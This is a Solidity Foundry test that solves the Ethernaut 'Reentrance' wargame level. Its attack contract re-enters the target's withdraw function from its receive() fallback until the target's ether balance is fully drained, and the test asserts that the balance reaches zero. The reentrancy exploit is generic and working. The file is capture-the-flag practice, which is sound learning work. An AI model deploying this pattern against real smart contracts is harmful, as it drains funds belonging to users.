// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentranceAttack {
    IReentrance target;
    uint256 initialDeposit;

    constructor(address _target) {
        target = IReentrance(_target);
    }

    function attack() public payable {
        initialDeposit = msg.value;
        
        target.donate{value: initialDeposit}(address(this));
        
        target.withdraw(initialDeposit);
    }
    receive() external payable {
        uint256 targetBalance = address(target).balance;
        
        if (targetBalance >= initialDeposit) {
            target.withdraw(initialDeposit);
        } else if (targetBalance > 0) {
            target.withdraw(targetBalance);
        }
    }
}

interface IEthernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address _instance) external;
}

contract EthernautReentranceTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address levelFactory = 0x2a24869323C0B13Dff24E196Ba072dC790D52479;

    function testLevel10_Reentrance() public {
        address hacker = makeAddr("hacker");
        vm.deal(hacker, 1 ether);
        vm.startPrank(hacker);

        vm.recordLogs();
        ethernaut.createLevelInstance{value: 0.001 ether}(levelFactory);
        
        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 instanceTopic = entries[entries.length - 1].topics[2];
        address levelAddr = address(uint160(uint256(instanceTopic)));
        
        console.log("Target Address:", levelAddr);
        console.log("Saldo Target Awal:", levelAddr.balance);

        console.log("Meluncurkan Serangan Re-entrancy...");
        
        ReentranceAttack attackContract = new ReentranceAttack(levelAddr);
        
        uint attackAmount = 0.0005 ether; 
        attackContract.attack{value: attackAmount}();

        console.log("Saldo Target Akhir:", levelAddr.balance);
        console.log("Saldo Hacker Contract:", address(attackContract).balance);
        
        assertEq(levelAddr.balance, 0);
        console.log("HACKED! Target terkuras habis.");

        ethernaut.submitLevelInstance(levelAddr);
        vm.stopPrank();
    }
}